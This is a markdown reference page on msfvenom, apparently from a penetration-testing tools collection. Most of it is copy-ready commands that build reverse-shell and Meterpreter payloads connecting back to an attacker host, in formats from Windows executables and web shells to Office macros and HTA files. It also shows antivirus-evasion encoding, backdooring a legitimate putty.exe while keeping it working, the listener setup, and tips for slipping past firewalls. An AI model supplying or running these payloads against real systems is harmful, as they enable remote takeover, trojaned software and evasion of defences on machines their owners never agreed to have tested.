---
title: "msfvenom"
category: "exploitation"
tags: ["metasploit", "payload", "shellcode", "reverse-shell", "exploitation", "encoding"]
---

# msfvenom

## Overview

msfvenom is the payload generation component of the Metasploit Framework, combining the functionality of the legacy msfpayload and msfencode tools. It creates customized payloads for various platforms including Windows, Linux, macOS, Android, and web applications. These payloads can be output in multiple formats such as executables, scripts, shellcode, and more. msfvenom is essential for penetration testers to generate reverse shells, bind shells, and staged/stageless meterpreter sessions.

## Installation

msfvenom is included with the Metasploit Framework, which is pre-installed on Kali Linux:

```bash
# Install Metasploit Framework on Debian/Ubuntu
sudo apt update
sudo apt install metasploit-framework

# Verify installation
msfvenom --version

# List all available payloads
msfvenom -l payloads

# List all available encoders
msfvenom -l encoders

# List all output formats
msfvenom -l formats
```

## Basic Usage

```bash
# Basic syntax
msfvenom -p <payload> [options] -f <format> -o <output_file>

# Common options:
# -p    Payload to use
# -f    Output format (exe, elf, raw, python, c, etc.)
# -o    Output file path
# -a    Architecture (x86, x64)
# --platform    Target platform (windows, linux, osx)
# LHOST    Local host (attacker IP for reverse shells)
# LPORT    Local port (attacker listening port)
# -e    Encoder to use
# -i    Number of encoding iterations
# -b    Bad characters to avoid
# -n    NOP sled length
```

## Key Features

### Multi-Platform Support
- Windows (32/64-bit executables, DLLs, PowerShell)
- Linux (ELF binaries, shell scripts)
- macOS (Mach-O binaries)
- Android (APK files)
- Web payloads (PHP, ASP, JSP, WAR)
- Cross-platform (Python, Java, Ruby)

### Payload Types
- **Staged Payloads** (`/`): Smaller initial payload that downloads the full payload (e.g., `windows/meterpreter/reverse_tcp`)
- **Stageless Payloads** (`_`): Complete payload in a single package (e.g., `windows/meterpreter_reverse_tcp`)
- **Bind Shells**: Target opens a port for attacker to connect
- **Reverse Shells**: Target connects back to attacker

### Encoding and Evasion
- Multiple encoders for AV evasion
- Bad character avoidance
- Iterative encoding
- Custom templates

## Common Use Cases

### Windows Reverse Shell (Meterpreter)
```bash
# 32-bit Windows Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# 64-bit Windows Meterpreter reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell64.exe

# Stageless Meterpreter (larger but more reliable)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell_stageless.exe
```

### Linux Reverse Shell
```bash
# 32-bit Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# 64-bit Linux Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell64.elf
```

### Web Payloads
```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# WAR file (for Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f aspx -o shell.aspx
```

### Script-Based Payloads
```bash
# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py

# Bash reverse shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.sh

# PowerShell reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o shell.ps1

# PowerShell command (base64 encoded)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd -o shell_cmd.txt
```

### Shellcode Generation
```bash
# C-formatted shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o shellcode.c

# Python-formatted shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -o shellcode.py

# Raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin

# Hex-formatted shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex
```

### Encoded Payloads (AV Evasion)
```bash
# Shikata Ga Nai encoder (polymorphic XOR)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe

# Avoid null bytes and newlines
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f exe -o clean_shell.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -e x86/countdown -i 2 -f exe -o multi_encoded.exe
```

### Custom Templates
```bash
# Inject payload into existing executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/putty.exe -f exe -o backdoored_putty.exe

# Keep original functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/putty.exe -k -f exe -o backdoored_putty.exe
```

### Other Formats
```bash
# DLL payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o shell.dll

# MSI installer
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o shell.msi

# HTA (HTML Application)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hta-psh -o shell.hta

# VBA macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba -o macro.vba
```

## Setting Up the Handler

After generating a payload, set up a listener in Metasploit:

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

Or as a one-liner:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
```

## Tips and Best Practices

1. **Match Payload Architecture**: Ensure 32-bit payloads target 32-bit systems and 64-bit for 64-bit systems. 32-bit payloads may work on 64-bit systems but not vice versa.

2. **Avoid Default Ports**: Do not use common ports like 4444 in real engagements. Use ports like 443, 80, or 8080 that may bypass firewall rules.

3. **Use Stageless for Reliability**: Staged payloads are smaller but require a stable connection. Stageless payloads are larger but more reliable for unstable networks.

4. **Test Before Deployment**: Always test payloads in a controlled environment before using them in an engagement.

5. **Modern AV Evasion**: Basic encoding (shikata_ga_nai) is often detected. Consider using custom packers, crypters, or manual obfuscation techniques.

6. **HTTPS Payloads**: Use HTTPS reverse shells (`reverse_https`) to encrypt traffic and blend with normal network activity.

7. **Check Bad Characters**: When exploiting buffer overflows, identify and avoid bad characters using the `-b` flag.

8. **Use x64 When Possible**: 64-bit payloads are generally more stable on modern systems.

9. **Document Payload Hashes**: Keep track of file hashes for your generated payloads for reporting purposes.

10. **Clean Up After Engagement**: Remove all payloads from target systems after testing is complete.

## Related Tools

- **msfconsole** - Main Metasploit Framework interface for exploit execution and session handling
- **msfpc** - MSFvenom Payload Creator, a wrapper script for quick payload generation
- **venom** - Advanced payload generation with evasion techniques
- **unicorn** - PowerShell downgrade attack and shellcode injection tool
- **shellter** - Dynamic PE infector for AV evasion
- **veil-framework** - Payload generation framework focused on AV evasion
- **cobalt-strike** - Commercial adversary simulation tool with beacon payloads
